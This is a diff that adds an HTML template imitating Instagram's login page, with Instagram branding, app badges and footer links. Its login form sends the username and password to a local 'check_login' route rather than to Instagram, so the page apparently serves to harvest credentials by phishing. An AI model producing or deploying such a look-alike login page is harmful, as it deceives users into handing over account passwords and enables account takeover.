@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Instagram</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    
+    
+    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="images/ico/apple-touch-icon-76x76-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="images/ico/apple-touch-icon-120x120-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="images/ico/apple-touch-icon-152x152-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="167x167" href="images/ico/apple-touch-icon-167x167-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="images/ico/apple-touch-icon-180x180-precomposed.png">
+    <!-- <link rel="icon" sizes="192x192" href="images/ico/favicon-192.png"> -->
+
+    <link rel="icon" sizes="192x192" href="{{ url_for('static', filename='images/ico/favicon-192.png') }}">
+
+    
+
+
+
+    
+    <link rel="mask-icon" href="{{ url_for('static', filename='images/ico/favicon.svg') }}" color="#262626">
+    <link rel="shortcut icon" type="image/x-icon" href="{{ url_for('static', filename='images/ico/favicon.ico') }}">
+    <script type="text/javascript" src="{{ url_for('static', filename='js/dist/bundle.js') }}"></script>
+</head>
+<body>
+    <!--[if lt IE 7]>
+        <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="#">upgrade your browser</a> to improve your experience.</p>
+        <![endif]-->
+        
+        <div class="container main">
+            <div class="row no-gutters d-flex align-items-center">
+                <div class="col-md-6 phones d-flex justify-content-end hidden-sm-down">
+                    <img src="{{ url_for('static', filename='images/homepage/home-phones-withpic.png') }}" alt="" class="">
+                </div>
+                <div class="col-md-6 col-sm-12">
+                    <div class="loginbox">
+                        <div class="card d-flex">
+                            <div class="card-block">
+                                <h4 class="card-title mx-auto">Instagram</h4>
+                                
+                                <form action="check_login" class="ig-loginform">
+                                    <div class="form-group">
+                                        <input type="text" class="form-control ig-form" name="username" placeholder="Username">
+                                    </div>
+                                    <div class="form-group">
+                                        <input type="text" class="form-control ig-form" name="password" placeholder="Password">
+                                    </div>
+                                    <div class="form-group">
+                                        <button type="submit" class="btn btn-sm btn-block btn-primary">Login</button>
+                                    </div>
+                                </form>
+                        
+                                
+                                <p class="card-text text-center"><a href="#">Forgot you password?</a></p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <br>
+                    <div class="text-center loginbox">
+                        <p class="text-center">Get the app</p>
+                    </div>
+                    <div class="d-flex loginbox justify-content-center">
+                        <div style="margin-right: 10px"><img src="{{ url_for('static', filename='images/appstore-install-badges/badge_ios_english-en.png') }}" alt="" width="136" height="40"></div>
+                        <div><img src="{{ url_for('static', filename='images/appstore-install-badges/badge_android_english-en.png') }}" alt="" width="134.28" height="40"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="container footer">
+            <nav class="navbar navbar-toggleable-md navbar-light">
+                    <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">About us</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Support</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">Blog</a>
+                        </li>
+                        <li class="nav-item"><a href="#" class="nav-link">Press</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">A.P.I.</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">Jobs</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">Privacy</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">Terms</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">Directory</a></li>
+                        <li class="nav-item"><a href="#" class="nav-link">Language</a></li>
+                    </ul>
+                    <span>© 2024 Instagram</span>
+            </nav>
+        </div>
+    </body>
+    </html>
